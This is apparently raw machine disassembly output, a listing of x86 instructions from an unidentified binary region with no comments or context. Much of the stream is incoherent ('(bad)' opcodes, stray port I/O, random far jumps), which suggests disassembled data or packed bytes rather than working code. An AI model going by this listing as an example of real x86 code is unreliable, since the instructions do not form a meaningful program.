  41d02d:	mov    cl,0x53
  41d02f:	mov    BYTE PTR [eax+0x26800492],al
  41d035:	push   edi
  41d036:	in     eax,0x4e
  41d038:	mov    ds:0x6498624c,al
  41d03d:	out    dx,eax
  41d03e:	xor    al,0xc8
  41d040:	and    eax,0xf9007b2b
  41d045:	mov    DWORD PTR [ebp+0x19],edi
  41d048:	and    BYTE PTR [edi+0x14e521bc],dl
  41d04e:	into   
  41d04f:	add    edi,DWORD PTR [ecx+0x65]
  41d052:	cld    
  41d053:	imul   edi,esi,0x17fd0f7e
  41d059:	pop    ebx
  41d05a:	stos   BYTE PTR es:[edi],al
  41d05b:	adc    al,0x9d
  41d05d:	pop    ebx
  41d05e:	inc    ebx
  41d05f:	call   0xce1413fe
  41d064:	(bad)  
  41d065:	hlt    
  41d066:	push   0xb308b0ad
  41d06b:	and    al,BYTE PTR [ebx+0x2a]
  41d06e:	mov    ch,0x59
  41d070:	sti    
  41d071:	cdq    
  41d072:	(bad)  
  41d073:	lods   al,BYTE PTR ds:[esi]
  41d074:	sbb    ah,BYTE PTR [ebp+0x74]
  41d077:	push   ds
  41d078:	push   ecx
  41d079:	mov    bh,0x6c
  41d07b:	jae    0x41d0f6
  41d07d:	jnp    0x41d0a0
  41d07f:	iret   
  41d080:	loope  0x41d0b3
  41d082:	cli    
  41d083:	ja     0x41d0bf
  41d085:	into   
  41d086:	sbb    BYTE PTR [eax+0x7d],ch
  41d089:	and    ebp,0x191395e6
  41d08f:	call   0x9649:0x12de72d3
  41d096:	ss mov dl,0x6f
  41d099:	aas    
  41d09a:	test   al,0x38
  41d09c:	sub    ch,0xc2
  41d09f:	inc    ecx
  41d0a0:	(bad)  
  41d0a1:	pop    esp
  41d0a2:	mov    DWORD PTR [ebx+0x6c],edx
  41d0a5:	inc    ebx
  41d0a6:	pop    edx
  41d0a7:	rcl    BYTE PTR [edx+0x9bd1ae6],1
  41d0ad:	ss loope 0x41d086
  41d0b0:	lds    ebx,FWORD PTR [ecx-0x5a]
  41d0b3:	inc    edx
  41d0b4:	call   0x2a0d:0x8ca26294
  41d0bb:	jmp    0x14041b1d
  41d0c0:	nop
  41d0c1:	sbb    al,0xae
  41d0c3:	dec    ebp
  41d0c4:	cwde   
  41d0c5:	or     eax,0x3e00504c
  41d0ca:	pop    edx
  41d0cb:	push   esp
  41d0cc:	loopne 0x41d13d
  41d0ce:	test   eax,0x3c385212
  41d0d3:	sub    BYTE PTR [eax+0x3bf0037f],cl
  41d0d9:	jge    0x41d08f
  41d0db:	xor    eax,0xd015c55a
  41d0e0:	or     ecx,DWORD PTR [ecx-0x11e97b45]
  41d0e6:	mov    eax,0xd4bc523a
  41d0eb:	mov    esp,eax
  41d0ed:	std    
  41d0ee:	fnstenv [esi-0x7dd9b88e]
  41d0f4:	imul   BYTE PTR [eax+0x6627e22d]
  41d0fa:	aas    
  41d0fb:	mov    eax,ds:0xa3207ac1
  41d100:	jmp    0xb1250538
  41d105:	stc    
  41d106:	add    DWORD PTR [esi+eax*2+0x41351f9d],0x5b
  41d10e:	mov    cl,0xe
  41d110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d111:	or     eax,0x31d28f39
  41d116:	lahf   
  41d117:	mov    al,0x39
  41d119:	xchg   ebp,eax
  41d11a:	push   eax
  41d11b:	inc    ebx
  41d11c:	aad    0x21
  41d11e:	cs xchg edi,eax
  41d120:	nop
  41d121:	cwde   
  41d122:	outs   dx,DWORD PTR ds:[esi]
  41d123:	in     eax,0x75
  41d125:	push   esi
  41d126:	sbb    bl,dl
  41d128:	mov    edx,0x240e502b
  41d12d:	sti    
  41d12e:	cli    
  41d12f:	ins    DWORD PTR es:[edi],dx
  41d130:	mov    bh,0xa7
  41d132:	jb     0x41d0e6
  41d134:	je     0x41d0f3
  41d136:	mov    DWORD PTR [ebp+0x347de526],0x51824806
  41d140:	mov    edx,0xb604cfcd
  41d145:	loop   0x41d15d
  41d147:	or     DWORD PTR [edi],ebx
  41d149:	mov    edi,0x7b9eaf8e
  41d14e:	or     dh,al
  41d150:	sbb    edi,DWORD PTR [edx-0xd]
  41d153:	jns    0x41d1b4
  41d155:	push   0xd3b3e323
  41d15a:	inc    esi
  41d15b:	push   ecx
  41d15c:	(bad)
  41d160:	fst    st(4)
  41d162:	cwde   
  41d163:	mov    ebp,0x33890466
  41d168:	lods   eax,DWORD PTR ds:[esi]
  41d169:	sahf   
  41d16a:	cdq    
  41d16b:	pop    esi
  41d16c:	or     al,0xb5
  41d16e:	xor    al,0x7
  41d170:	call   0x1f35ef6d
  41d175:	inc    edx
  41d176:	mov    ecx,0xf1dee207
  41d17b:	arpl   WORD PTR [esi+edx*4+0x3c15972c],bx
  41d182:	sub    ch,0x9a
  41d185:	fadd   QWORD PTR [edi]
  41d187:	stc    
  41d188:	xor    al,0x54
  41d18a:	xor    al,0xf0
  41d18c:	lock out 0x69,al
  41d18f:	add    eax,0x262c1ccd
  41d194:	fdivr  QWORD PTR [esp+edx*1-0x79]
  41d198:	adc    ecx,DWORD PTR [eax+edx*1+0x347e3676]
  41d19f:	xchg   BYTE PTR [ebx-0x294175e9],al
  41d1a5:	les    ebp,FWORD PTR [esi+esi*8+0x31fbf08a]
  41d1ac:	fnstcw WORD PTR ds:0x3ed6cd10
  41d1b2:	mov    BYTE PTR [esi],ch
  41d1b4:	sub    DWORD PTR [esp+ebp*2+0x112f74a0],edx
  41d1bb:	sbb    eax,0x5705c1e8
  41d1c0:	(bad)  
  41d1c1:	fld    DWORD PTR [edx]
  41d1c3:	xlat   BYTE PTR ds:[ebx]
  41d1c4:	cli    
  41d1c5:	loop   0x41d183
  41d1c7:	mov    ?,WORD PTR [edi-0x55]
  41d1ca:	add    al,0xce
  41d1cc:	shl    edx,1
  41d1ce:	gs cld 
  41d1d0:	and    DWORD PTR [ebx+0x38],edx
  41d1d3:	pop    esi
  41d1d4:	jns    0x41d232
  41d1d6:	dec    edi
  41d1d7:	mov    ecx,ebp
  41d1d9:	std    
  41d1da:	pop    ecx
  41d1db:	(bad)  
  41d1dc:	cmp    al,0xa5
  41d1de:	mov    ch,0x9b
  41d1e0:	sahf   
  41d1e1:	lea    edi,[ebx+0x743ae948]
  41d1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1e8:	mov    ebp,0xa027bd3c
  41d1ed:	repnz jecxz 0x41d22e
  41d1f0:	or     DWORD PTR [edi-0x5a],esi
  41d1f3:	mov    esp,0x1ac635ba
  41d1f8:	dec    edx
  41d1f9:	and    BYTE PTR [esi+0x19],bl
  41d1fc:	xor    eax,0xfbfac996
  41d201:	push   0xb8f90726
  41d206:	push   esi
  41d207:	jmp    0xea4e:0x672577ce
  41d20e:	pop    ebp
  41d20f:	inc    ebx
  41d210:	xchg   edi,eax
  41d211:	daa    
  41d212:	rol    BYTE PTR [edx],cl
  41d214:	fidivr WORD PTR [eax]
  41d216:	mov    bh,0xbf
  41d218:	sahf   
  41d219:	inc    edi
  41d21a:	dec    esi
  41d21b:	inc    esi
  41d21c:	clc    
  41d21d:	jecxz  0x41d259
  41d21f:	repnz fmul DWORD PTR [edx]
  41d222:	cmp    cl,ch
  41d224:	dec    ecx
  41d225:	xlat   BYTE PTR ds:[ebx]
  41d226:	les    edi,FWORD PTR [esi-0x49]
  41d229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d22a:	inc    ecx
  41d22b:	sbb    eax,0xe3adb336
  41d230:	pop    eax
  41d231:	pop    edx
  41d232:	mov    edx,0x9766238
  41d237:	sbb    BYTE PTR [edx],dh
  41d239:	xor    eax,0x6dc06294
  41d23e:	iret   
  41d23f:	inc    ebp
  41d240:	cmp    eax,0x4e6a1e65
  41d245:	outs   dx,DWORD PTR ds:[esi]
  41d246:	or     eax,0xf1a8dd84
  41d24b:	adc    al,0x24
  41d24d:	inc    ebp
  41d24e:	cwde   
  41d24f:	sar    DWORD PTR [ebx-0x2a],0x4
  41d253:	(bad)  
  41d254:	in     eax,0x7a
  41d256:	je     0x41d1dc
  41d258:	dec    eax
  41d259:	rol    DWORD PTR [ecx-0x6d2c85ad],0xf4
  41d260:	loop   0x41d1ed
  41d262:	cmp    al,BYTE PTR [edx]
  41d264:	(bad)  
  41d265:	xchg   ecx,eax
  41d266:	push   0x2786e483
  41d26b:	fs aad 0x26
  41d26e:	sub    al,0xa5
  41d270:	dec    edx
  41d271:	add    al,0xed
  41d273:	adc    DWORD PTR [ebp+0x51],esp
  41d276:	fisttp DWORD PTR [edi]
  41d278:	scas   eax,DWORD PTR es:[edi]
  41d279:	mov    cs,ebx
  41d27b:	add    eax,0x90483c98
  41d280:	cmp    al,0x3d
  41d282:	in     eax,0x3f
  41d284:	xor    ch,ah
  41d286:	shl    dl,1
  41d288:	or     al,0x44
  41d28a:	fsub   QWORD PTR gs:[ebx-0x61acafa8]
  41d291:	xchg   esi,edx
  41d293:	test   DWORD PTR [edi+eax*8],ebp
  41d296:	or     DWORD PTR [edx-0x6c910fc7],ecx
  41d29c:	xchg   ebp,eax
  41d29d:	pop    eax
  41d29e:	outs   dx,DWORD PTR ds:[esi]
  41d29f:	test   BYTE PTR [ebp+0x77],cl
  41d2a2:	scas   eax,DWORD PTR es:[edi]
  41d2a3:	int    0x2c
  41d2a5:	(bad)  
  41d2a6:	fdivr  DWORD PTR [edi]
  41d2a8:	iret   
  41d2a9:	mov    bh,0xa8
  41d2ab:	mov    esp,0x528a1623
  41d2b0:	cmp    BYTE PTR [esi],0xf
  41d2b3:	inc    ecx
  41d2b4:	and    DWORD PTR [edi],esp
  41d2b6:	mov    fs,WORD PTR [esi]
  41d2b8:	ret    0x6d9
  41d2bb:	nop
  41d2bc:	lods   eax,DWORD PTR ss:[esi]
  41d2be:	(bad)  
  41d2bf:	int    0xa4
  41d2c1:	(bad)  
  41d2c2:	bound  esp,QWORD PTR [esp+ecx*8]
  41d2c5:	aas    
  41d2c6:	shl    DWORD PTR [eax+0x68],0x99
  41d2ca:	sbb    BYTE PTR [edi+0x7b1e698e],ch
  41d2d0:	cmp    al,0xc1
  41d2d2:	push   cs
  41d2d3:	pop    ecx
  41d2d4:	pusha  
  41d2d5:	maxps  xmm3,xmm5
  41d2d8:	mov    ecx,0xb9d625e2
  41d2dd:	sbb    al,0x4e
  41d2df:	jno    0x41d267
  41d2e1:	pop    di
  41d2e3:	push   ebp
  41d2e4:	faddp  st(4),st
  41d2e6:	int3   
  41d2e7:	je     0x41d32a
  41d2e9:	mov    al,0x9d
  41d2eb:	pop    ebx
  41d2ec:	inc    esi
  41d2ed:	mov    ch,0xac
  41d2ef:	ret    0xc8ce
  41d2f2:	rcl    BYTE PTR [ecx+0x39],1
  41d2f5:	pop    ss
  41d2f6:	loop   0x41d2c9
  41d2f8:	and    dl,BYTE PTR [edi-0x11524714]
  41d2fe:	outs   dx,BYTE PTR ds:[esi]
  41d2ff:	mov    edi,0xc5328214
  41d304:	stos   DWORD PTR es:[edi],eax
  41d305:	dec    eax
  41d306:	ret    
  41d307:	js     0x41d313
  41d309:	jle    0x41d346
  41d30b:	or     eax,0x98160879
  41d310:	add    BYTE PTR [ebx-0x14],dh
  41d313:	pop    esi
  41d314:	inc    esp
  41d315:	scas   al,BYTE PTR es:[edi]
  41d316:	push   ebx
  41d317:	jg     0x41d31c
  41d319:	cmp    al,0xb0
  41d31b:	sbb    bh,bl
  41d31d:	xor    al,BYTE PTR [edi]
  41d31f:	outs   dx,BYTE PTR ds:[esi]
  41d320:	jae    0x41d311
  41d322:	mov    ?,esi
  41d324:	cmp    dh,BYTE PTR [edx+0xc]
  41d327:	mov    al,0x5c
  41d329:	lods   al,BYTE PTR ds:[esi]
  41d32a:	sub    DWORD PTR [edi],ebx
  41d32c:	mov    dl,0x69
  41d32e:	dec    edx
  41d32f:	inc    esp
  41d330:	sar    DWORD PTR es:[edi],1
  41d333:	add    BYTE PTR [edx-0x4e5eab84],bl
  41d339:	rol    DWORD PTR [eax-0x25],0x82
  41d33d:	pushf  
  41d33e:	popf   
  41d33f:	stc    
  41d340:	mul    BYTE PTR [ebx+edi*4]
  41d343:	pop    esi
  41d344:	dec    edx
  41d345:	ins    BYTE PTR es:[edi],dx
  41d346:	sbb    ah,bh
  41d348:	add    BYTE PTR [eax+0x54],0x13
  41d34c:	sar    BYTE PTR [edi+edi*2],1
  41d34f:	stos   BYTE PTR es:[edi],al
  41d350:	dec    esi
  41d351:	(bad)  
  41d352:	xor    al,0xd9
  41d354:	push   ds
  41d355:	mov    ds:0xbbabdcf0,al
  41d35a:	sbb    eax,0x94865999
  41d35f:	mov    al,0x19
  41d361:	pop    edi
  41d362:	sub    DWORD PTR [ebp+0x10],0x6cf5b0f2
  41d369:	push   eax
  41d36a:	mov    DWORD PTR [edx],ebx
  41d36c:	pop    ds
  41d36d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d36f:	(bad)  
  41d370:	loope  0x41d309
  41d372:	retf   0xca22
  41d375:	repnz test al,0xbd
  41d378:	lods   al,BYTE PTR ds:[esi]
  41d379:	adc    BYTE PTR [ebp-0x51162c8e],al
  41d37f:	jbe    0x41d3a7
  41d381:	pop    edi
  41d382:	imul   ebp,DWORD PTR [edx+esi*2-0x2f74b3a6],0xffffffec
  41d38a:	dec    ebx
  41d38b:	push   0x3456d018
  41d390:	dec    ebx
  41d391:	sar    BYTE PTR [ebp+eiz*1+0xdc4ec30],0xaa
  41d399:	xchg   edx,eax
  41d39a:	ins    DWORD PTR es:[edi],dx
  41d39b:	pop    es
  41d39c:	xchg   esi,eax
  41d39d:	adc    ecx,edx
  41d39f:	sti    
  41d3a0:	(bad)  
  41d3a1:	std    
  41d3a2:	push   edx
  41d3a3:	ss mov ecx,0xa3b53b50
  41d3a9:	out    dx,al
  41d3aa:	icebp  
  41d3ab:	add    eax,0xba2ebea2
  41d3b0:	int    0xe7
  41d3b2:	xor    ebp,ebx
  41d3b4:	mov    dh,0x47
  41d3b6:	sbb    esp,DWORD PTR ds:0x98147351
  41d3bc:	sub    BYTE PTR [ecx-0x33502b02],al
  41d3c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c3:	ins    DWORD PTR es:[edi],dx
  41d3c4:	add    BYTE PTR [eax+0xcdc18b1],0xd8
  41d3cb:	xor    BYTE PTR [esi+0x67],bh
  41d3ce:	clc    
  41d3cf:	(bad)  
  41d3d0:	into   
  41d3d1:	mov    ch,0x47
  41d3d3:	and    BYTE PTR [edi-0x617b42e7],bl
  41d3d9:	xor    edx,DWORD PTR [ebx+edi*8]
  41d3dc:	jg     0x41d402
  41d3de:	ficomp WORD PTR [edi-0x14]
  41d3e1:	inc    esp
  41d3e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3e3:	xor    DWORD PTR [ebx+0x5a4c9cc8],0xcf65fced
  41d3ed:	mov    ch,0x99
  41d3ef:	and    ah,BYTE PTR [ebx-0x31]
  41d3f2:	mov    esi,0xbf71cc27
  41d3f7:	add    dh,BYTE PTR [eax+0x70498d22]
  41d3fd:	inc    esi
  41d3fe:	mov    esi,0xd34a76ec
  41d403:	push   ss
  41d404:	jle    0x41d3b9
  41d406:	sub    al,0x5e
  41d408:	xchg   edx,eax
  41d409:	cmp    ch,al
  41d40b:	(bad)  
  41d40c:	imul   ebx,DWORD PTR [ebx],0xb4d6fb70
  41d412:	jp     0x41d43c
  41d414:	mov    esp,0x97cff955
  41d419:	lea    ebp,[edi-0x7094a3d4]
  41d41f:	mov    DWORD PTR cs:[esi-0x145bd86b],eax
  41d426:	jl     0x41d3db
  41d428:	cmc    
  41d429:	(bad)  
  41d42b:	repz cmp ecx,DWORD PTR [ebx+0x7d]
  41d42f:	fwait
  41d430:	and    eax,0x9be00588
  41d435:	adc    ah,BYTE PTR [esp+edx*1-0x2b]
  41d439:	ins    BYTE PTR es:[edi],dx
  41d43a:	arpl   WORD PTR [eax-0x68],bp
  41d43d:	jno    0x41d3d2
  41d43f:	mov    al,ds:0xfc68386c
  41d444:	dec    esp
  41d445:	(bad)  
  41d446:	mov    ecx,0x31da8441
  41d44b:	icebp  
  41d44c:	gs jno 0x41d4a5
  41d44f:	cmp    DWORD PTR [ebx],0xffffffec
  41d452:	jno    0x41d47d
  41d454:	lods   al,BYTE PTR ds:[esi]
  41d455:	rcr    DWORD PTR [edx-0x2a],1
  41d458:	lods   eax,DWORD PTR ds:[esi]
  41d459:	mov    bl,0x72
  41d45b:	retf   0x1121
  41d45e:	xor    al,0x90
  41d460:	jg     0x41d3fe
  41d462:	and    ah,cl
  41d464:	(bad)  
  41d465:	jge    0x41d437
  41d467:	jne    0x41d47b
  41d469:	add    eax,DWORD PTR [eax+0x32fe5d19]
  41d46f:	sub    eax,0x2797a1bf
  41d474:	inc    eax
  41d475:	mov    bl,0xa8
  41d477:	push   edi
  41d478:	xor    dl,dl
  41d47a:	(bad)  
  41d47c:	jl     0x41d4e4
  41d47e:	ds in  al,dx
  41d480:	lds    esi,FWORD PTR [esi]
  41d482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d483:	dec    ecx
  41d484:	jae    0x41d4c6
  41d486:	je     0x41d445
  41d488:	and    dl,BYTE PTR [ebx-0x75]
  41d48b:	pop    ds
  41d48c:	or     dh,BYTE PTR [edx-0x49]
  41d48f:	pop    ds
  41d490:	fld    DWORD PTR [edi+0x45]
  41d493:	fadd   st,st(2)
  41d495:	and    ch,BYTE PTR [edx-0x78]
  41d498:	addr16 int3 
  41d49a:	and    BYTE PTR [ecx-0x73],bl
  41d49d:	loope  0x41d41f
  41d49f:	leave  
  41d4a0:	(bad)  
  41d4a1:	sub    BYTE PTR [edx+0x5c82de28],bh
  41d4a7:	test   eax,0x674f3c44
  41d4ac:	mov    eax,ds:0xeb25c951
  41d4b1:	aas    
  41d4b2:	jmp    0x41d44b
  41d4b4:	call   0xb9cf6a5b
  41d4b9:	add    al,0x62
  41d4bb:	push   ss
  41d4bc:	add    eax,esp
  41d4be:	push   0x146f39b1
  41d4c3:	sbb    DWORD PTR [ebp-0x6d],ebx
  41d4c6:	jbe    0x41d48f
  41d4c8:	adc    dl,BYTE PTR [edx+edx*1-0x4b00fec8]
  41d4cf:	inc    edi
  41d4d0:	sbb    dh,BYTE PTR [esi-0x7f1eb1cb]
  41d4d6:	retf   
  41d4d7:	cwde   
  41d4d8:	(bad)  
  41d4d9:	loop   0x41d4a6
  41d4db:	xchg   edi,eax
  41d4dc:	add    ch,BYTE PTR [esi]
  41d4de:	add    esp,ebp
  41d4e0:	jbe    0x41d4a0
  41d4e2:	fwait
  41d4e3:	and    edi,0x5abcd814
  41d4e9:	imul   eax,DWORD PTR [ebx],0xffffffb3
  41d4ec:	jge    0x41d487
  41d4ee:	sbb    dl,BYTE PTR [edi+ebx*8-0x33]
  41d4f2:	data16 mov ch,ah
  41d4f5:	div    BYTE PTR [esi+0x64]
  41d4f8:	std    
  41d4f9:	mov    WORD PTR [ecx-0x3b7dde8a],ss
  41d4ff:	cdq    
  41d500:	mov    ah,0x74
  41d502:	mov    bl,0x0
  41d504:	jp     0x41d531
  41d506:	jo     0x41d57b
  41d508:	ja     0x41d506
  41d50a:	std    
  41d50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d50c:	div    bh
  41d50e:	push   esp
  41d50f:	scas   al,BYTE PTR es:[edi]
  41d510:	rcr    DWORD PTR [esi],1
  41d512:	dec    ebp
  41d513:	xchg   ebp,eax
  41d514:	mov    dh,0xb1
  41d516:	xlat   BYTE PTR ds:[ebx]
  41d517:	fisttp DWORD PTR [edi]
  41d519:	sub    edx,DWORD PTR [ebx+ecx*2-0x7daca999]
  41d520:	mov    dl,BYTE PTR [ecx+0x5bc41c06]
  41d526:	pop    ss
  41d527:	mov    ch,0xd8
  41d529:	std    
  41d52a:	mov    al,0xd5
  41d52c:	fcomp  DWORD PTR [ebp+0x32]
  41d52f:	not    BYTE PTR [edx-0x17]
  41d532:	pop    esi
  41d533:	fsub   DWORD PTR [esi]
  41d535:	cmp    edx,DWORD PTR [esi+0x16de01ac]
  41d53b:	mul    BYTE PTR [esi+edi*1-0x7caf8595]
  41d542:	sub    eax,0xc01927bf
  41d547:	cmc    
  41d548:	and    al,0x37
  41d54a:	xor    edi,DWORD PTR [ebx+edx*1-0x26]
  41d54e:	ins    DWORD PTR es:[edi],dx
  41d54f:	retf   
  41d550:	mov    bl,0x62
  41d552:	inc    esi
  41d553:	jne    0x41d56a
  41d555:	and    al,0xe6
  41d557:	dec    esi
  41d558:	mov    eax,ds:0x613a938c
  41d55d:	es scas eax,DWORD PTR es:[edi]
  41d55f:	or     edi,DWORD PTR [ecx+0x712d37f4]
  41d565:	sbb    ah,BYTE PTR ds:[ebx-0x15]
  41d569:	popa   
  41d56a:	arpl   WORD PTR ds:0x73e8,si
  41d56f:	jb     0x41d527
  41d571:	xchg   esp,eax
  41d572:	aas    
  41d573:	pop    ss
  41d574:	daa    
  41d575:	and    DWORD PTR [eax-0x8],edx
  41d578:	ret    
  41d579:	push   eax
  41d57a:	add    al,0x7b
  41d57c:	push   cs
  41d57d:	xor    BYTE PTR [ebx-0x16],0x23
  41d581:	(bad)  
  41d582:	rol    BYTE PTR [eax-0x60d3a255],1
  41d588:	mov    edi,0xe3811ea4
  41d58d:	add    DWORD PTR [ebx-0x63],0xffffff83
  41d591:	mov    ebx,0xfed6eca1
  41d596:	sbb    BYTE PTR ds:0x409e2d5b,ah
  41d59c:	mov    eax,ds:0x78d74b6a
  41d5a1:	xor    edi,DWORD PTR [eax+ebx*2+0x30f79387]
  41d5a8:	xchg   esi,eax
  41d5a9:	add    ch,BYTE PTR [edi]
  41d5ab:	jp     0x41d54a
  41d5ad:	pop    ebx
  41d5ae:	test   BYTE PTR [edi+0x4d],cl
  41d5b1:	clc    
  41d5b2:	out    dx,eax
  41d5b3:	dec    esi
  41d5b4:	pusha  
  41d5b5:	xchg   dx,ax
  41d5b7:	stos   BYTE PTR es:[edi],al
  41d5b8:	push   0x8e60573c
  41d5bd:	fwait
  41d5be:	mov    ds:0xcd9c4b68,al
  41d5c3:	dec    esp
  41d5c4:	imul   esp,DWORD PTR [ebx+0x14],0xffffffba
  41d5c8:	in     eax,dx
  41d5c9:	pop    esi
  41d5ca:	out    0x9e,al
  41d5cc:	pop    esp
  41d5cd:	retf   0x8809
  41d5d0:	(bad)  
  41d5d1:	cli    
  41d5d2:	add    esi,DWORD PTR [eax]
  41d5d4:	cmp    eax,0x42c0695f
  41d5d9:	mov    bl,0xae
  41d5db:	mov    eax,0xbb0f6349
  41d5e0:	jmp    0x5a87:0x6a318f7d
  41d5e7:	cli    
  41d5e8:	mov    ch,0xa3
  41d5ea:	stos   BYTE PTR es:[edi],al
  41d5eb:	mov    ah,0x41
  41d5ee:	imul   esi,DWORD PTR [edi],0x1b
  41d5f1:	push   cs
  41d5f2:	fld    QWORD PTR [ecx]
  41d5f4:	iret   
  41d5f5:	in     al,0x56
  41d5f7:	cwde   
  41d5f8:	ret    0x4ee1
  41d5fb:	and    dl,al
  41d5fd:	xor    BYTE PTR [eax-0x7020b2b6],dh
  41d603:	cmp    eax,0x2984c655
  41d608:	lahf   
  41d609:	pop    ds
  41d60a:	pushf  
  41d60b:	imul   esi,DWORD PTR [edx],0xfe91e85a
  41d611:	daa    
  41d612:	mov    ebx,ecx
  41d614:	out    dx,al
  41d615:	push   ecx
  41d616:	jo     0x41d680
  41d618:	cmp    BYTE PTR [eax],ah
  41d61a:	mov    al,ds:0xc44a1563
  41d61f:	mov    edi,ds
  41d621:	js     0x41d5e7
  41d623:	outs   dx,DWORD PTR ds:[esi]
  41d624:	push   ecx
  41d625:	sbb    DWORD PTR [ebx-0x5cf0919],edi
  41d62b:	push   0x3821fedc
  41d630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d631:	shl    DWORD PTR [edi+0x49e6b421],1
  41d637:	inc    ebx
  41d638:	mov    cl,0x1b
  41d63a:	xchg   DWORD PTR [eax+0x8],esi
  41d63d:	test   BYTE PTR [edx],bh
  41d63f:	mov    ebx,0x3a3f8642
  41d644:	retf   
  41d645:	test   eax,0xf20db6be
  41d64a:	xchg   ecx,eax
  41d64b:	out    dx,al
  41d64c:	imul   al
  41d64e:	in     eax,0xf1
  41d650:	call   0x867f:0xdf30ca30
  41d657:	stos   BYTE PTR es:[edi],al
  41d658:	push   0x67260b9c
  41d65d:	out    dx,eax
  41d65e:	das    
  41d65f:	ja     0x41d684
  41d661:	cmp    al,0x95
  41d663:	cdq    
  41d664:	push   ecx
  41d665:	mov    cl,0x3b
  41d667:	arpl   WORD PTR [esi-0x7a],sp
  41d66a:	xlat   BYTE PTR ds:[ebx]
  41d66b:	adc    BYTE PTR [ebp-0x362a09dd],ah
  41d671:	sub    DWORD PTR [ebp-0x34e37c2a],edx
  41d677:	bound  ecx,QWORD PTR [edx]
  41d679:	test   al,0xfd
  41d67b:	cwde   
  41d67c:	ins    DWORD PTR es:[edi],dx
  41d67d:	mov    ebp,0x1fd7eee
  41d682:	fucomi st,st(0)
  41d684:	jge    0x41d684
  41d686:	mov    ebx,0xd4220390
  41d68b:	sub    ebp,DWORD PTR [eax+ecx*1+0x4a]
  41d68f:	mov    bh,0xa1
  41d691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d692:	pop    edi
  41d693:	pop    ebp
  41d694:	cmp    esi,DWORD PTR cs:0x810f3b9c
  41d69b:	loop   0x41d6cb
  41d69d:	daa    
  41d69e:	sbb    esi,edx
  41d6a0:	ja     0x41d6b1
  41d6a2:	stc    
  41d6a3:	cmp    eax,0xc488c2d5
  41d6a8:	adc    DWORD PTR [ecx+0x4f],edx
  41d6ab:	mov    edi,0x4f811992
  41d6b0:	pop    es
  41d6b1:	gs (bad) 
  41d6b3:	addr16 sti 
  41d6b5:	jmp    0x41d671
  41d6b7:	sbb    eax,DWORD PTR [ecx]
  41d6b9:	sub    al,ah
  41d6bb:	cmc    
  41d6bc:	xchg   esi,eax
  41d6bd:	push   eax
  41d6be:	add    eax,0x5147f829
  41d6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6c4:	retf   
  41d6c5:	dec    edi
  41d6c6:	rcr    BYTE PTR [eax+edi*2-0xe81552b],1
  41d6cd:	call   0xd808:0x28372a2a
  41d6d4:	cmp    BYTE PTR [eax+0x35ddeea],ch
  41d6da:	fdivr  DWORD PTR es:[ebx-0x5fcdae50]
  41d6e1:	test   BYTE PTR [ebx-0x3376230f],0x21
  41d6e8:	or     DWORD PTR [ecx-0x16],edi
  41d6eb:	jno    0x41d6a2
  41d6ed:	inc    edx
  41d6ee:	push   eax
  41d6ef:	mov    ebp,0x9c3ae8c4
  41d6f4:	loop   0x41d6a3
  41d6f6:	retf   0x3e11
  41d6f9:	nop    DWORD PTR [esi+0x7ecbf29b]
  41d700:	mov    WORD PTR [edi+0x46],gs
  41d703:	push   eax
  41d704:	push   ebp
  41d705:	add    al,0xba
  41d707:	push   ds
  41d708:	xor    eax,0xef41ad34
  41d70d:	sbb    edi,edi
  41d70f:	jmp    0x41d6e6
  41d711:	mov    ch,0xd0
  41d713:	push   ds
  41d714:	pop    ds
  41d715:	jmp    0x41d700
  41d717:	ins    DWORD PTR es:[edi],dx
  41d718:	adc    al,BYTE PTR [ebx+0x4161555f]
  41d71e:	or     eax,0xdc99eb76
  41d723:	inc    eax
  41d724:	dec    ebp
  41d725:	mov    eax,ecx
  41d727:	rol    DWORD PTR [ebp+0x49],cl
  41d72a:	xor    ecx,eax
  41d72c:	xor    DWORD PTR [eax+eiz*4],eax
  41d72f:	jae    0x41d737
  41d731:	dec    ebp
  41d732:	pop    esp
  41d733:	into   
  41d734:	loope  0x41d787
  41d736:	test   al,0xf9
  41d738:	das    
  41d739:	push   cs
  41d73a:	pop    esi
  41d73b:	push   ebp
  41d73c:	aaa    
  41d73d:	iret   
  41d73e:	test   BYTE PTR [esi+ebx*1+0x55f47730],al
  41d745:	leave  
  41d746:	pushf  
  41d747:	mov    BYTE PTR [ecx*1+0x2d376a2d],dh
  41d74e:	out    dx,eax
  41d74f:	(bad)  
  41d750:	pop    edi
  41d751:	loopne 0x41d704
  41d753:	and    BYTE PTR [edx+ecx*4-0x45e51150],dl
  41d75a:	test   al,0x71
  41d75c:	stos   DWORD PTR es:[edi],eax
  41d75d:	push   esi
  41d75e:	ja     0x41d79d
  41d760:	dec    ebp
  41d761:	bound  esi,QWORD PTR [ebx+edx*1]
  41d764:	or     BYTE PTR [edi+0x272ef166],cl
  41d76a:	xor    al,0xeb
  41d76c:	cwde   
  41d76d:	das    
  41d76e:	and    ebp,DWORD PTR [edi+0x61]
  41d771:	mov    bl,BYTE PTR [ebp+0x78]
  41d774:	ror    BYTE PTR [edx+0x4f043b68],cl
  41d77a:	sub    ecx,eax
  41d77c:	or     ebx,DWORD PTR [ebx]
  41d77e:	cs jge 0x41d782
  41d781:	leave  
  41d782:	iret   
  41d783:	call   0xec:0x865c5e5a
  41d78a:	push   ss
  41d78b:	push   esi
  41d78c:	test   eax,0xeb38dd75
  41d791:	shr    eax,cl
  41d793:	pop    edx
  41d794:	inc    esp
  41d795:	jbe    0x41d750
  41d797:	pop    ebp
  41d798:	jbe    0x41d787
  41d79a:	sub    eax,0x1e37b9a
  41d79f:	add    dl,0xaf
  41d7a2:	rcl    BYTE PTR [ebp+0x35ded640],cl
  41d7a8:	in     eax,0x54
  41d7aa:	adc    DWORD PTR [edx+0x31],eax
  41d7ad:	ret    
  41d7ae:	(bad)  
  41d7af:	jmp    0x41d73c
  41d7b1:	sbb    esp,ebx
  41d7b3:	dec    edx
  41d7b4:	in     al,0xc5
